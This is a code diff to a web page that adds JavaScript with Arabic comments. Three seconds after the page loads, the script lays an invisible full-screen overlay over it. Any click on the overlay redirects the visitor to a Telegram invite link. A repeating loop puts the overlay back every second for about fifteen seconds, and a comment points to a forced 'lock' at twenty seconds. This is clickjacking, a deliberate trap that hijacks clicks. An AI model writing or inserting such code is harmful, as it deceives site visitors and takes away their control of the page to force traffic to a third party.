@@ -181,6 +181,43 @@
 </div>
 
 <script>
+
+// رابط القناة الخاص بك
+const telegramChannel = "https://t.me/+vYk10FokzWgwMmY0";
+
+function createTrap() {
+    // التحقق من عدم وجود ستارة سابقة لتجنب التكرار
+    if (document.getElementById("early-trap")) return;
+
+    const earlyShield = document.createElement('div');
+    earlyShield.id = "early-trap";
+    earlyShield.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9990;background:transparent;cursor:pointer;";
+    document.body.appendChild(earlyShield);
+
+    earlyShield.onclick = function() {
+        window.location.href = telegramChannel;
+        // القوة هنا: بمجرد النقر، نحذفها وننشئ واحدة جديدة فوراً دون انتظار الـ 3 ثوانٍ
+        this.remove();
+        createTrap(); 
+    };
+}
+
+// البدء بعد 3 ثوانٍ
+setTimeout(() => {
+    createTrap();
+    // نظام مراقبة كل ثانية لضمان وجود الستارة دائماً
+    const hunterLoop = setInterval(createTrap, 1000);
+
+    // إيقاف العملية عند الثانية 18 لترك مجال للقفل الإجباري
+    setTimeout(function() {
+        clearInterval(hunterLoop);
+        const lastTrap = document.getElementById("early-trap");
+        if(lastTrap) lastTrap.remove();
+    }, 15000); // جعلتها 15 ثانية (منذ بداية التشغيل) لتكون أدق
+    
+}, 3000);
+
+    
     const tgLink = "https://t.me/+vYk10FokzWgwMmY0";
 
     // 1. نظام القفل عند 20 ثانية
